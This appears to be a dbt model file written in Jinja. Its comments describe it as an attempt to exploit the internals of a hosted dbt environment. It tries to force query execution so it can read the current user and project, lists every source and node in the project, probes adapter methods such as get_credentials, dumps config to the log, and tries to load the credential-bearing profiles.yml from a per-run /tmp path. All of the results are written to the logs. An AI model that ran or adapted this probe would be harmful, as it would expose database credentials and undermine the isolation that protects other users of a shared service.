{# Dig deep — exploit error paths and internal objects #}

{# 1. Try to set execute=True to enable run_query #}
{%- do context.update({'execute': True}) if context.update is defined -%}
{{ log("EXECUTE_AFTER_UPDATE=" ~ execute, info=True) }}

{# 2. Try run_query even with execute=False — check error message #}
{%- if run_query is defined -%}
  {%- set rq_result = '' -%}
  {%- if execute -%}
    {{ log("EXECUTE_IS_TRUE_RUNNING_QUERY", info=True) }}
    {%- set rq_result = run_query("SELECT current_user() as u, @@project_id as p") -%}
    {{ log("RUN_QUERY_RESULT=" ~ rq_result | string | truncate(500), info=True) }}
  {%- else -%}
    {{ log("EXECUTE_IS_FALSE_SKIPPING_QUERY", info=True) }}
  {%- endif -%}
{%- endif -%}

{# 3. Explore graph object for all project connections/sources #}
{%- if graph is defined -%}
  {%- if graph.sources is defined -%}
    {{ log("GRAPH_SOURCES_COUNT=" ~ graph.sources | length, info=True) }}
    {%- for key, src in graph.sources.items() -%}
      {{ log("SOURCE=" ~ key ~ " db=" ~ src.database ~ " schema=" ~ src.schema, info=True) }}
    {%- endfor -%}
  {%- endif -%}
  
  {%- if graph.exposures is defined -%}
    {{ log("GRAPH_EXPOSURES_COUNT=" ~ graph.exposures | length, info=True) }}
  {%- endif -%}
  
  {# List all nodes #}
  {%- for key, node in graph.nodes.items() -%}
    {{ log("NODE=" ~ key ~ " type=" ~ node.resource_type ~ " path=" ~ node.path, info=True) }}
  {%- endfor -%}
{%- endif -%}

{# 4. Adapter dispatch — try to call internal methods #}
{%- if adapter.dispatch is defined -%}
  {{ log("ADAPTER_DISPATCH_AVAILABLE=YES", info=True) }}
  
  {# Try to get connection manager #}
  {%- set conn_mgr = adapter.get_connection() if adapter.get_connection is defined else 'NO_METHOD' -%}
  {{ log("ADAPTER_GET_CONNECTION=" ~ conn_mgr | string | truncate(200), info=True) }}
  
  {# Try adapter methods #}
  {%- for method_name in ['get_connection', 'create_schema', 'get_credentials', 'get_config', 'get_compiler', 'acquire_connection'] -%}
    {%- if adapter[method_name] is defined -%}
      {{ log("ADAPTER_HAS_" ~ method_name ~ "=YES", info=True) }}
    {%- endif -%}
  {%- endfor -%}
{%- endif -%}

{# 5. Explore config for credentials_path or profile path #}
{%- set cfg = config -%}
{{ log("CONFIG_VARS=" ~ cfg | string | truncate(500), info=True) }}

{# 6. Try set() to modify context #}
{%- do set('execute', True) -%}
{{ log("EXECUTE_AFTER_SET=" ~ execute, info=True) }}

{# 7. Try load_agate_table with profiles.yml path #}
{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'norun') -%}
{%- set profiles = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' -%}
{{ log("ATTEMPTING_LOAD_AGATE=" ~ profiles, info=True) }}
{%- set agate_result = load_agate_table(model, profiles) -%}
{{ log("AGATE_RESULT=" ~ agate_result | string | truncate(500), info=True) }}

SELECT 1 as id
